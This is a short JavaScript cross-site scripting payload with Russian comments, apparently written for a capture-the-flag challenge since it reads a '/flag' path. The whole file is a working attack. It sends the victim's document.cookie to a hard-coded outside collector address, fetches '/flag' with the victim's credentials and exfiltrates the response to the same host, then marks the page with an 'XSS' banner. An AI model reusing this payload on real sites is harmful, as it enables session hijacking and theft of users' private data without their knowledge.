// expl1.js - версия для вашего сервера
var collector = 'http://109.234.39.144:8889/';

// Отправляем куки через Image
new Image().src = collector + '?cookie=' + encodeURIComponent(document.cookie);

// Пробуем прочитать флаг
fetch('/flag', {credentials: 'include'})
    .then(r => r.text())
    .then(flag => {
        new Image().src = collector + '?flag=' + encodeURIComponent(flag);
    })
    .catch(e => {});

// Визуальный индикатор
document.body.innerHTML += '<div style="position:fixed;top:0;left:0;background:lime;color:black;z-index:99999;padding:5px;">✅ XSS</div>';